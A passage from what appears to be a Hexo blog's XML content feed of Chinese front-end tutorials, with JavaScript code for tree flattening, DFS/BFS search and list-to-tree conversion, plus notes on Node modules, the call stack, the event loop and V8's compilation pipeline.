class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 深度优先拍平数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleExpendDFS</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">list</span>) &#123;</span><br><span class="line">    list.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">      result.<span class="title function_">push</span>(item);</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">        <span class="title function_">fn</span>(item.<span class="property">children</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">fn</span>(list);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="深度优先拍平数据（非递归）利用stack先进后出的特性"><a href="#深度优先拍平数据（非递归）利用stack先进后出的特性" class="headerlink" title="深度优先拍平数据（非递归）利用stack先进后出的特性"></a>深度优先拍平数据（非递归）<code>利用stack先进后出的特性</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 深度优先拍平数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleExpendDFS1</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> result = [];</span><br><span class="line">  <span class="keyword">let</span> satck = [...list];</span><br><span class="line">  <span class="keyword">while</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(satck) &amp;&amp; satck.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> item = satck.<span class="title function_">pop</span>();</span><br><span class="line">    result.<span class="title function_">push</span>(item);</span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">      satck.<span class="title function_">push</span>(...item.<span class="property">children</span>)</span><br><span class="line">      <span class="comment">// for (let i = 0; i &lt; item.children.length; i++) &#123;</span></span><br><span class="line">      <span class="comment">//   const ele = item.children[i];</span></span><br><span class="line">      <span class="comment">//   satck.push(ele);</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="广度优先拍平数据-利用queue先进先出的特性"><a href="#广度优先拍平数据-利用queue先进先出的特性" class="headerlink" title="广度优先拍平数据 利用queue先进先出的特性"></a>广度优先拍平数据 <code>利用queue先进先出的特性</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 广度优先拍平数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleExpendBFS</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">let</span> queue = [...list];</span><br><span class="line">  <span class="keyword">while</span> (queue.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> item = queue.<span class="title function_">shift</span>();</span><br><span class="line">    result.<span class="title function_">push</span>(item);</span><br><span class="line">    <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">      queue.<span class="title function_">push</span>(...item.<span class="property">children</span>)</span><br><span class="line">      <span class="comment">// item.children.forEach(k=&gt; &#123;</span></span><br><span class="line">      <span class="comment">//   queue.push(k)</span></span><br><span class="line">      <span class="comment">// &#125;)</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="如何在树形结构中查找指定数据-？"><a href="#如何在树形结构中查找指定数据-？" class="headerlink" title="如何在树形结构中查找指定数据 ？"></a>如何在树形结构中查找指定数据 ？</h3><h4 id="深度优先搜索算法递归"><a href="#深度优先搜索算法递归" class="headerlink" title="深度优先搜索算法递归"></a>深度优先搜索算法<code>递归</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 递归实现深度优先搜索算法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">name</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleDFS</span> = (<span class="params">list, name</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> hasFound = <span class="literal">false</span>,</span><br><span class="line">    target;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">list, name</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(list) &amp;&amp; !hasFound) &#123;</span><br><span class="line">      list.<span class="title function_">forEach</span>(<span class="function">(<span class="params">i</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i.<span class="property">name</span> === name) &#123;</span><br><span class="line">          hasFound = <span class="literal">true</span>;</span><br><span class="line">          target = i;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i.<span class="property">children</span>) &#123;</span><br><span class="line">          <span class="title function_">fn</span>(i.<span class="property">children</span>, name);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">fn</span>(list, name);</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="广度优先遍历实现搜索算法-利用queue先进先出的特性"><a href="#广度优先遍历实现搜索算法-利用queue先进先出的特性" class="headerlink" title="广度优先遍历实现搜索算法 利用queue先进先出的特性"></a>广度优先遍历实现搜索算法 <code>利用queue先进先出的特性</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 广度优先遍历实现搜索算法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">name</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">handleBFS</span> = (<span class="params">list, name</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> result;</span><br><span class="line">  <span class="keyword">let</span> queue = list;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(queue)) &#123;</span><br><span class="line">    <span class="keyword">while</span> (queue.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> item = queue.<span class="title function_">shift</span>();</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="property">name</span> === name) &#123;</span><br><span class="line">        result = item;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (item.<span class="property">children</span>) &#123;</span><br><span class="line">        item.<span class="property">children</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">i</span>) =&gt;</span> &#123;</span><br><span class="line">          queue.<span class="title function_">push</span>(i);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> tree </tag>
            
            <tag> dfs </tag>
            
            <tag> bfs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一维List转树形结构</title>
      <link href="/2022/05/05/list-to-tree/"/>
      <url>/2022/05/05/list-to-tree/</url>
      
        <content type="html"><![CDATA[<h3 id="一维-list-生成树行结构"><a href="#一维-list-生成树行结构" class="headerlink" title="一维 list 生成树行结构"></a>一维 list 生成树行结构</h3><h4 id="原始数据"><a href="#原始数据" class="headerlink" title="原始数据"></a>原始数据</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> datas = [</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">0</span>, <span class="attr">parentId</span>: <span class="literal">null</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单A&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">parentId</span>: <span class="number">0</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单A&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">parentId</span>: <span class="number">0</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单B&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">parentId</span>: <span class="number">0</span>, <span class="attr">name</span>: <span class="string">&quot;一级菜单C&quot;</span>, <span class="attr">rank</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">4</span>, <span class="attr">parentId</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;二级菜单A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">5</span>, <span class="attr">parentId</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&quot;二级菜单A-B&quot;</span>, <span class="attr">rank</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">6</span>, <span class="attr">parentId</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&quot;二级菜单B-A&quot;</span>, <span class="attr">rank</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">7</span>, <span class="attr">parentId</span>: <span class="number">4</span>, <span class="attr">name</span>: <span class="string">&quot;三级菜单A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">3</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">8</span>, <span class="attr">parentId</span>: <span class="number">7</span>, <span class="attr">name</span>: <span class="string">&quot;四级菜单A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">4</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">9</span>, <span class="attr">parentId</span>: <span class="number">8</span>, <span class="attr">name</span>: <span class="string">&quot;五级菜单A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">5</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">10</span>, <span class="attr">parentId</span>: <span class="number">9</span>, <span class="attr">name</span>: <span class="string">&quot;六级菜单A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">6</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">11</span>, <span class="attr">parentId</span>: <span class="number">10</span>, <span class="attr">name</span>: <span class="string">&quot;七级菜单A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">7</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">12</span>, <span class="attr">parentId</span>: <span class="number">11</span>, <span class="attr">name</span>: <span class="string">&quot;八级菜单A-A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">8</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">13</span>, <span class="attr">parentId</span>: <span class="number">12</span>, <span class="attr">name</span>: <span class="string">&quot;九级菜单A-A-A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">9</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">id</span>: <span class="number">14</span>, <span class="attr">parentId</span>: <span class="number">13</span>, <span class="attr">name</span>: <span class="string">&quot;十级菜单A-A-A-A-A-A-A-A-A-A&quot;</span>, <span class="attr">rank</span>: <span class="number">10</span> &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="递归形式转换"><a href="#递归形式转换" class="headerlink" title="递归形式转换"></a>递归形式转换</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">toTree</span> = (<span class="params">arr = [], parentId</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> array = []</span><br><span class="line">    arr.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (item.<span class="property">parentId</span> === parentId) &#123;</span><br><span class="line">            item.<span class="property">children</span> = <span class="title function_">toTree</span>(arr, item.<span class="property">id</span>)</span><br><span class="line">            array.<span class="title function_">push</span>(item)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> array</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="对象引用遍历实现"><a href="#对象引用遍历实现" class="headerlink" title="对象引用遍历实现"></a>对象引用遍历实现</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对象引用遍历实现</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; <span class="variable">list</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">toTree</span> = (<span class="params">list</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> result = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">  list.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    map[item.<span class="property">id</span>] = item;</span><br><span class="line">  &#125;);</span><br><span class="line">  list.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> parent = map[item.<span class="property">parentId</span>];</span><br><span class="line">    <span class="keyword">if</span> (parent) &#123;</span><br><span class="line">      (parent.<span class="property">children</span> || (parent.<span class="property">children</span> = [])).<span class="title function_">push</span>(item);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.<span class="title function_">push</span>(item);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> tree </tag>
            
            <tag> object-reference </tag>
            
            <tag> list </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node模块机制</title>
      <link href="/2022/04/26/node-module/"/>
      <url>/2022/04/26/node-module/</url>
      
        <content type="html"><![CDATA[<h3 id="node-模块"><a href="#node-模块" class="headerlink" title="node 模块"></a>node 模块</h3><h4 id="核心模块"><a href="#核心模块" class="headerlink" title="核心模块"></a>核心模块</h4><p>核心模块部分在 Node 源代码的编译过程中，编译进了二进制执行文 件。在Node 进程启动时，部分核心模块就被直接加载进内存中，所以这部分核心模块引入时，文件定位和编译执行这两个步骤可以省略掉，并且在路径分析中优先判断，所以它的加载速度是最快的。</p><h4 id="文件模块"><a href="#文件模块" class="headerlink" title="文件模块"></a>文件模块</h4><p>文件模块则是在运行时动态加载，需要完整的路径分析、文件定位、编译执行过程，速度比核心模块慢。</p>]]></content>
      
      
      <categories>
          
          <category> BackEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> modules </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript运行原理(三)</title>
      <link href="/2022/03/15/js-runtime3/"/>
      <url>/2022/03/15/js-runtime3/</url>
      
        <content type="html"><![CDATA[<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>栈：先进后出，进栈，出栈</p><p>队列：先进先出</p><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>调用栈是 JS 引擎追踪函数执行流程的一种机制，当执行环境中调用了多个函数时，通过这种机制，我们能够追踪到哪个函数正在执行，执行的函数体又调用了哪个函数</p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p><code>调用栈，调用函数执行才回入栈</code></p><ol><li><p>push average()</p></li><li><p>push sum()</p></li><li><p>shift sum()</p></li><li><p>shift average()</p></li><li><p>push console.log()</p></li><li><p>shift console.log()</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">average</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> aver = <span class="title function_">sum</span>(a, b) / <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> aver;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> num = <span class="title function_">average</span>(<span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num);</span><br></pre></td></tr></table></figure><h4 id="Event-Loop"><a href="#Event-Loop" class="headerlink" title="Event Loop"></a>Event Loop</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">4</span>);</span><br><span class="line">  &#125;, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span> <span class="title function_">executor</span>(<span class="params">resolve</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/video/BV13k4y1y7vU">参考视频（原文作者）</a></p>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> node </tag>
            
            <tag> v8 </tag>
            
            <tag> EventLoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript运行原理(二)</title>
      <link href="/2022/03/12/js-runtime2/"/>
      <url>/2022/03/12/js-runtime2/</url>
      
        <content type="html"><![CDATA[<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><img width="500" align="center" src="/images/js-runtime/7.png" alt="ronaldoxzb" /><h5 id="哪些程序用到-V8"><a href="#哪些程序用到-V8" class="headerlink" title="哪些程序用到 V8"></a>哪些程序用到 V8</h5><ul><li>Chrome 浏览器的 JS 引擎是 V8</li><li>Nodejs 的运行时环境是 V8</li><li>electron 的底层引擎是 V8 【ɪˈlektrɑːn】 跨平台桌面应用开发工具</li></ul><p>blink 是渲染引擎，V8 是 JS 引擎</p><p>访问 Dom 的接口是由 Blink 提供的<br><img width="500" align="center" src="/images/js-runtime/8.png" alt="ronaldoxzb" /></p><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><p><code>接收 JavaScript 代码，编译代码后执行 C++程序，编译后的代码可以在多种操作系统多种处理器上运行。</code></p><ol><li>编译和执行 JS 代码</li><li>处理调用栈</li><li>内存分配</li><li>垃圾回收</li></ol><h4 id="V8-的-js-编译和执行"><a href="#V8-的-js-编译和执行" class="headerlink" title="V8 的 js 编译和执行"></a>V8 的 js 编译和执行</h4><img width="500" align="center" src="/images/js-runtime/9.png" alt="ronaldoxzb" /><ol><li>解析器 parser：源代码 -&gt; AST</li><li>解释器 interpreter：AST -&gt; <code>bytecode</code> 或（直接执行<code>bytecode</code> <code>bytecode</code>是可是直接执行的，但是效率没有机器代码效率高）</li><li>编译器 compiler：编译出机器代码（相比于<code>bytecode</code>运行更加高效）</li></ol><p>V8 版本 5.9 之前没有解释器，但是有两个编译器</p><h4 id="5-9-版本的-V8"><a href="#5-9-版本的-V8" class="headerlink" title="5.9 版本的 V8"></a>5.9 版本的 V8</h4><img width="500" align="center" src="/images/js-runtime/11.png" alt="ronaldoxzb" />1. parser 解释器生成抽象语法树 AST<ol start="2"><li><p><code>full-codegen</code>（基准编译器）编译器将 <code>AST</code> 编译成机器代码（未被优化）</p></li><li><p><code>分析器线程</code>收集足够数据（目的：帮助<code>Crankshaft</code>（优化编译器）做代码优化 ）</p></li><li><p>需要优化的<strong>源码</strong>重新解析生成<code>AST</code>，然后由<code>Crankshaft</code>生成优化过后的机器代码</p></li></ol><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ol><li>没有<code>bytecode</code>而是直接编译成机器代码,机器码会占用大量的内存</li><li>缺少中间层机器码，无法实现一些优化策略</li><li>无法很好的支持和优化 JS 的新语特性，无法拥抱未来</li></ol><img width="200" align="center" src="/images/js-runtime/12.png" alt="ronaldoxzb" /><h4 id="新版本的-V8"><a href="#新版本的-V8" class="headerlink" title="新版本的 V8"></a>新版本的 V8</h4><img width="500" align="center" src="/images/js-runtime/13.png" alt="ronaldoxzb" /><ol><li>parser 解析器 生成 AST 抽象语法树</li><li>interpreter 解释器 <code>Ignition</code> 生成 <code>byteCode</code> 字节码 并直接执行</li><li>清除 AST 释放内存空间</li><li>得到 25% - 50%的等效机器代码大小</li><li>compiler 运行过程中，解释器收集优化信息发送给编译器 <code>TurboFan</code></li><li>重新生成机器码</li><li>有些<code>热点函数</code>变更会由优化后的机器码还原成字节码 也就是 <code>deoptimization</code> 回退字节码操作执行</li></ol><img width="500" align="center" src="/images/js-runtime/14.png" alt="ronaldoxzb" /><h5 id="优化点："><a href="#优化点：" class="headerlink" title="优化点："></a>优化点：</h5><ol><li>值声明未调用，不会被解析生成 AST</li><li>函数只被调用一次，bytcode 直接被解释执行，不会进入到编译优化阶段</li><li>函数被调用多次，Igniton 会收集函数类型信息，可能会被标记为热点函数，可能被编译成优化后的机器代码</li></ol><h5 id="好处："><a href="#好处：" class="headerlink" title="好处："></a>好处：</h5><ol><li>由于一开始不需要直接编译成机器码，生成了中间层的字节码，从而节约了时间</li><li>优化编译阶段，不需要从源码重新解析,直接通过字节码进行优化，也可以 deoptimization 回退操作</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span 